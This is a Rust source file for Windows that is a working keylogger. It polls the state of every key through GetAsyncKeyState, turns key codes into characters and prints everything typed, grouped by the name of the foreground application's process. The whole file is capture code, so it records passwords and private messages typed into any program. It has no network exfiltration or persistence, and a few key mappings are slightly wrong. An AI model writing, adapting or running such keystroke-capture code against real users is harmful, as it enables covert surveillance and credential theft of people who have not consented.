use std::{thread, time::Duration};
use windows_sys::Win32::{
    System::{
        ProcessStatus::GetProcessImageFileNameW,
        Threading::{OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION},
    },
    UI::{
        Input::KeyboardAndMouse::{GetAsyncKeyState, VK_SHIFT},
        WindowsAndMessaging::{GetForegroundWindow, GetWindowThreadProcessId},
    },
};

fn log_message(s: &str) {
    print!("{}", s);
    use std::io::Write;
    let _ = std::io::stdout().flush();
}

fn key_notes(k: u8, is_shift_or_caps: bool) -> String {
    let oem = |base: char, shifted: char| -> String {
        if is_shift_or_caps {
            shifted.to_string()
        } else {
            base.to_string()
        }
    };

    match k {
        65..=90 => {
            let ch = k as char;
            if is_shift_or_caps {
                ch.to_ascii_uppercase().to_string()
            } else {
                ch.to_ascii_lowercase().to_string()
            }
        }
        48..=57 => {
            if is_shift_or_caps {
                match k {
                    48 => ")".to_string(),
                    49 => "!".to_string(),
                    50 => "@".to_string(),
                    51 => "#".to_string(),
                    52 => "$".to_string(),
                    53 => "%".to_string(),
                    54 => "^".to_string(),
                    55 => "&".to_string(),
                    56 => "*".to_string(),
                    57 => "(".to_string(),
                    _ => unreachable!(),
                }
            } else {
                (k as char).to_string()
            }
        }
        0x20 => " ".to_string(),
        0xBA => oem(';', ':'),
        0xBB => oem('+', '*'),
        0xBC => oem(',', '<'),
        0xBD => oem('-', '_'),
        0xBE => oem('.', '>'),
        0xBF => oem('/', '?'),
        0xC0 => oem('`', '~'),
        0xDB => oem('[', '{'),
        0xDC => oem('\\', '|'),
        0xDD => oem(']', '}'),
        0xDE => oem('\'', '"'),
        0x08 => "<Backspace>".to_string(),
        0x09 => "<Tab>".to_string(),
        0x0D => "<Enter>".to_string(),
        0x11 => "<Ctrl>".to_string(),
        0x12 => "<Alt>".to_string(),
        0x1B => "<Esc>".to_string(),
        0x5B | 0x5C => "<Win>".to_string(),
        0xA2 | 0xA3 => "<Ctrl>".to_string(),
        0xA4 | 0xA5 => "<Alt>".to_string(),
        0x10 | 0x14 | 0xA0 | 0xA1 => String::new(),
        _ => String::new(),
    }
}

fn main() {
    let mut current_app = String::new();
    let mut tokens: Vec<String> = Vec::new();
    let mut displayed_len = 0;

    loop {
        thread::sleep(Duration::from_millis(10));

        unsafe {
            let hwnd = GetForegroundWindow();
            let mut pid: u32 = 0;
            GetWindowThreadProcessId(hwnd, &mut pid);
            let handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);

            let process_name = {
                const LEN: usize = 256;
                let mut buffer = vec![0u16; LEN];
                GetProcessImageFileNameW(handle, buffer.as_mut_ptr(), LEN as u32);
                let len = buffer.iter().position(|&c| c == 0).unwrap_or(LEN);
                let path = String::from_utf16_lossy(&buffer[..len]);
                if let Some(idx) = path.rfind('\\') {
                    path[idx + 1..].to_string()
                } else {
                    path
                }
            };

            if process_name != current_app {
                if !current_app.is_empty() {
                    log_message("\n");
                }
                let prefix = format!("{}: ", process_name);
                log_message(&prefix);
                current_app = process_name;
                tokens.clear();
                displayed_len = prefix.len();
            }

            let is_shift_pressed = GetAsyncKeyState(VK_SHIFT as i32) & 0x8000u16 as i16 != 0;

            for i in 0..=255 {
                let key_state = GetAsyncKeyState(i);
                if (key_state & 1) > 0 {
                    if i == 0x08 {
                        if !tokens.is_empty() {
                            tokens.pop();
                            redraw_line(&current_app, &tokens, &mut displayed_len);
                        }
                        continue;
                    }

                    let key_str = key_notes(i as u8, is_shift_pressed);
                    if !key_str.is_empty() {
                        tokens.push(key_str);
                        redraw_line(&current_app, &tokens, &mut displayed_len);
                    }
                }
            }
        }
    }
}

fn redraw_line(app_name: &str, tokens: &[String], displayed_len: &mut usize) {
    let prefix = format!("{}: ", app_name);
    let content: String = tokens.concat();
    let new_line = format!("{}{}", prefix, content);
    let new_len = new_line.len();

    print!("\r");
    for _ in 0..*displayed_len {
        print!(" ");
    }
    print!("\r");
    print!("{}", new_line);
    use std::io::Write;
    let _ = std::io::stdout().flush();

    *displayed_len = new_len;
}
